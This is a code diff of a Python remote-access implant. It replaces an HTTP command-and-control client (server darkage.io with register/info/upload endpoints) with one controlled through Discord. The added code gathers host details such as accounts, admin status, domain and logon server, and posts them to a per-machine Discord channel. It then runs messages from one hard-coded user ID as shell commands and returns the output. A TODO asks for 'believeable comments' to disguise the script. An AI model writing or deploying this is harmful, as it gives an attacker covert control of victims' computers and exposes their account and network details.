@@ -8,12 +8,22 @@ TODO: generate random believeable comments for the script.
     Please reach out to INSERT_NAME with any questions.
 """
 
+import json
 import os
 import platform
+import random
 import requests
 import socket
+import string
 import subprocess
 from pathlib import Path
+
+import discord
+from discord.ext import commands
+
+DISCORD_TOKEN = Path("E:\\CompSci\\lenny_token.txt").read_text(encoding="utf-8")
+CHECKIN_CHANNELS = set()
+LOCKFILE = Path("C:\\Windows\\Temp\\dbtagt.tmp")
 
 """
 TODO: for third-party modules, it should request them
@@ -34,53 +44,19 @@ TODO: need to change to use urllib or something that is in the standard
 library, or drop it to disk with requests
 """
 
-"""
-TODO: more enumeration
-echo %USERDOMAIN%
-echo %logonserver%
-"""
+try:
+    intents = discord.Intents.default()
+    intents.message_content = True
+    bot = commands.Bot(command_prefix="!", intents=intents)
+except:
+    exit(1)
 
-"""
-Endpoints to implement:
-/register : POST JSON of device_metadata ; return token
-/info     : GET with token ; return tasking (if any)
-/status   : POST command id and output ; return status code
-/upload   : POST file id and output ; return status code
+def main():    
+    bot.run(DISCORD_TOKEN)
 
-"""
-
-SERVER_URL = "http://www2.darkage.io:48172"
-LOCKFILE = Path("C:\\Windows\\Temp\\dbtagt.tmp")
-CHECK_INTERVAL = 30
-
-def main():
-    if not LOCKFILE.exists():
-        # Register for first time
-        bot_token = register_bot()
-        if bot_token:
-            LOCKFILE.touch()
-            LOCKFILE.write_text(bot_token, encoding="utf-8")
-        else:
-            exit(1)
-    
-    check_for_actions_loop(LOCKFILE.read_text(encoding="utf-8"))
-
-def register_bot():
-    """
-        Register bot with server.
-        Returns a unique bot_token and saves it
-    """
-    metadata = get_device_metadata()
-    metadata["version"] = "0.1"
-
-    endpoint = "/register"
-    full_url = SERVER_URL + endpoint
-
-    response = requests.post(full_url, json=metadata)
-    if response:
-        return response.json.get('token')
-    else:
-        return None
+def random_alphanumeric(length):
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for i in range(length))
 
 def get_device_metadata():
     """
@@ -95,17 +71,23 @@ def get_device_metadata():
 
     uname = platform.uname()
     winver = platform.win32_ver()
-    routing_out = routing.stdout
     local_accts = get_local_user_accounts()
     is_local_admin = get_local_admin_status()
+    userdomain = os.environ.get("USERDOMAIN")
+    logonserver = os.environ.get("LOGONSERVER")
 
-    return {
+    output_dict = {
         "hostname": hostname,
         "ip_list": filtered_ips,
         "os_info": str(uname)+str(winver),
         "accounts": local_accts,
-        "is_local_admin": is_local_admin
+        "is_local_admin": is_local_admin,
+        "userdomain": userdomain,
+        "logonserver": logonserver,
+        "version": "0.1"
     }
+
+    return json.dumps(output_dict, indent=4), output_dict
 
 def get_local_user_accounts():
     """
@@ -150,52 +132,14 @@ def get_local_admin_status():
     )
     return "S-1-5-32-544" in result.stdout
 
-def check_for_actions_loop(bot_token):
+def execute_command(cmd_str):
     """
-        See if the bot needs to do anything.
+        Execute a command on behalf of the bot.
     """
-    while True:
-        info = get_info_from_api(bot_token)
+    # TODO: parse command. Options:
+    # 
 
-        cmd = info.get('command')
-        upload = info.get('upload')
-
-        if cmd:
-            output_dict = execute_command(bot_token, cmd)
-            post_cmd_output(output_dict)
-
-        if upload:
-            content = get_content(upload)
-            post_content(url, content)
-
-        sleep(CHECK_INTERVAL)
-
-def get_info_from_api(bot_token):
-    """
-        Get any relevant information from the bot API.
-    """
-    endpoint = "/info"
-    full_url = SERVER_URL + endpoint
-    headers = {
-        "X-API-TOKEN": bot_token
-    }
-
-    response = requests.get(full_url, headers=headers)
-    if response:
-        return response.json()
-
-def execute_command(cmd):
-    """
-        cmd_id : guid of cmd from server
-        cmd_str : cmd_str to execute
-    """
-    cmd_str = cmd.get('cmd_str')
-    cmd_id  = cmd.get('cmd_id')
-
-    if not cmd_id or not cmd_str:
-        return None
-
-    output = subprocess.check_output(
+    output = subprocess.run(
         cmd_str,
         shell=True,
         stdout=subprocess.PIPE,
@@ -203,11 +147,10 @@ def execute_command(cmd):
         text=True
     )
 
-    # remove trailing newline if any
-    return {
-        'cmd_id': cmd_id,
-        'output': output.stdout
-    }
+    if len(output.stdout) > 0:
+        return output.stdout
+    else:
+        return "Command returned no output"
 
 def get_content(upload):
     """
@@ -277,6 +220,44 @@ def post_content(bot_token, content_dict):
         return response.status_code
     else:
         return None
+
+# Should run after Bot() object is created?
+@bot.event
+async def on_ready():
+    metadata_pretty, metadata = get_device_metadata()
+
+    # Get channel_name from LOCKFILE if it exists
+    if LOCKFILE.exists():
+        channel_name = LOCKFILE.read_text(encoding="utf-8")
+    else:
+        channel_name = (metadata['hostname'] + "-" + random_alphanumeric(4)).lower()
+
+    for guild in bot.guilds:
+        existing = discord.utils.get(guild.text_channels, name=channel_name)
+        if not existing:
+            new_channel = await guild.create_text_channel(channel_name)
+            await new_channel.send("📡 This channel was created for device check-ins!")
+            await new_channel.send(metadata_pretty)
+            CHECKIN_CHANNELS.add(channel_name)
+            LOCKFILE.write_text(str(channel_name), encoding="utf-8")
+
+        else:
+            CHECKIN_CHANNELS.add(channel_name)
+            await existing.send("📡 Bot has checked in again!")
+            await existing.send(metadata_pretty)
+
+@bot.event
+async def on_message(message):
+    # Ignore other bots (including ourselves)
+    if message.author.bot:
+        return
+    
+    # Only process messages in the relevant channel
+    if message.channel.name not in CHECKIN_CHANNELS:
+        return
+
+    if(message.author.id == 558898662772572160):
+        await message.channel.send(execute_command(message.content))
 
 if __name__ == "__main__":
     main()
